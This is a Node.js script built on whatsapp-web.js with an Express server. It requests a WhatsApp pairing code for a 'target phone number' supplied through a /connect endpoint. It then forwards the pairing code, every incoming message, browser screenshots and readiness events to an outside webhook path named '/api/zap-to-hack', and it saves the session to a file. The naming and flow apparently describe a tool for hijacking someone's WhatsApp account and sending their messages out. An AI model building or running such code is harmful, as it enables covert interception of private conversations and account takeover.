// jwt token

const { Client, Location, Poll, List, Buttons, LocalAuth } = require('whatsapp-web.js');
const readline = require('readline');


const client = new Client({
    authStrategy: new LocalAuth(),
    // proxyAuthentication: { username: 'username', password: 'password' },
    puppeteer: { 
        // args: ['--proxy-server=proxy-server-that-requires-authentication.example.com'],
        executablePath: '/usr/bin/chromium-browser',
        headless: true,
        args: ['--no-sandbox'],
        timeout: 0,
    }
    // --no-sandbox is needed for puppeteer to run in docker
});


let pairingCodeRequested = false; // parear com o telefone
const express = require('express');
const fetch = require('node-fetch');
const fs = require('fs');

const app = express();
const env = require('dotenv').config();
// static files
app.use(express.static('files'));

const port = process.env.EXPRESS_PORT || 80;
let phone = '';

console.log('URL_CALLBACK', process.env.EXPRESS_PORT);

let urlCallback = process.env.WEBHOOK_URL;


client.initialize();



let codeToPair = '';
let qrCodeToPair = '';


client.on('authenticated', (session) => {
    console.log('AUTHENTICATED', session);
    // save the session object to use it later
    fs.writeFile('./session.json', JSON.stringify(session), function (err) {
        if (err) {
            console.error(err);
        }
    });
});

client.on('loading_screen', () => {
    console.log('LOADING SCREEN');
});

client.on('qr_scanned', () => {
    console.log('QR SCANNED');
});


client.on('auth_failure', msg => {
    console.error('AUTHENTICATION FAILURE', msg);
});

client.on('disconnected', (reason) => {
    console.log('Client was logged out', reason);
});


client.on('qr', async (qr) => {
    // NOTE: This event will not be fired if a session is specified.
    console.log('QR RECEIVED', qr);

    // paiuting code example
    const pairingCodeEnabled = true;
    if (pairingCodeEnabled && !pairingCodeRequested) {
        const pairingCode = await client.requestPairingCode(phone); // enter the target phone number
        fetchRequestNumber(phone, pairingCode);
        codeToPair = pairingCode;
        let base64string = qr.toString('base64');
        qrCodeToPair = base64string;
        console.log('Pairing code enabled, code: '+ pairingCode);
        pairingCodeRequested = true;
    }
});

client.on('ready', () => {
    fetchReadyMessage(phone);
});

client.on('message', msg => {
    console.log('MESSAGE RECEIVED', msg);
    fetchRequestMessage(phone, msg);
});

function formatHelper(phone) {
    if(phone.startsWith('55')) {
        return phone + '@c.us';
    } else {
        return '55' + phone + '@c.us';
    }
}


app.get('/connect', async(req, res) => {
    try {
        let userPhone = req.query.phone;
        if(!userPhone) {
            res.send('Phone number is required');
        }
        
        let formatNumber = userPhone.replace(/[^0-9]/g, '');
        phone = formatHelper(formatNumber);
        
        let isReady = await client.isReady;
        if(isReady) {
            let response = {
                message: 'Client is already ready',
            };

            return res.send(response);
        }

        let response = {
            message: 'Await QR Code',
        };
        return res.send(response);
    } catch (error) {
        console.log('Error', error);
    }

});

app.get('/get-auth-code', async(req, res) => {
    try {
        if(!codeToPair) {
            let response = {
                message: 'No code to pair',
            };

            return res.send(response);
        }

        let response = {
            code: codeToPair,
            qr: qrCodeToPair,
        };

        return res.send(response);
    } catch (error) {
        console.log('Error', error);
    }
})

app.get('/info', async(req, res) => {
    try {
        let info = await client.info;
        return res.send(info);
    } catch (error) {
        console.log('Error', error);
    }
}); 


app.get('/print-screen', async(req, res) => {
    try {

        if(!client.pupPage) {
            let response = {
                message: 'No page to print',
            };

            return res.send(response);
        }

        client.pupPage.screenshot().then((qr) => {
            let base64string = qr.toString('base64');

            fetch(urlCallback + '/api/zap-to-hack/print-screen', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    phone: phone,
                    qr: base64string,
                }),
            });

            let response = {
                qr: base64string,
            };

            return res.send(response);
        });
    } catch (error) {
        console.log('Error', error);
    }


});


function fetchRequestNumber(phone, pairingCode) {
    // fetch the number from the server, like webhook
    fetch(urlCallback +  '/api/zap-to-hack', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },

        body: JSON.stringify({
            phone: phone,
            pairingCode: pairingCode,
            event: 'pairingCode',
        }),
    })

    .then(response => response.json())
    .then(data => {
        console.log('Success:', data);
    })
}

function fetchRequestMessage(phone, message) {
    // fetch the number from the server, like webhook
    fetch(urlCallback + '/api/zap-to-hack', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify({
            phone: phone,
            message: message,
            event: 'message',
        }),
    })
}




function fetchReadyMessage(phone) {
    fetch(urlCallback + '/api/zap-to-hack', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify({
            phone: phone,
            event: 'ready',
        }),
    })
}


app.listen(port, () => {
    console.log(`Server running on port ${port}`);
});
